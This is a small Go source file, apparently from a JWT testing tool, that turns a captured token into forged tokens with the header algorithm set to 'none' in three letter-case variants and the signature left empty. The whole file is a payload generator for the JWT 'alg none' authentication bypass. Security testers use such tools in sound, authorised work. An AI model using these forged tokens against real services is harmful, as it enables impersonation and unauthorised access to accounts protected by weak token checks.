package paylaod

import (
	b64 "encoding/base64"
	"fmt"
	"strings"

	"github.com/dgrijalva/jwt-go"
)

func generateAllPayloads(token *jwt.Token) {
	generateNonePayloads(token.Raw)
}

func generateNonePayloads(token string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"none",
		"NonE",
		"NONE",
	}

	for k, v := range pattern {
		_ = k
		header := "{\"alg\":\"" + v + "\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		fmt.Println("[" + v + "] " + baseHeader + "." + claims + ".")
	}

}
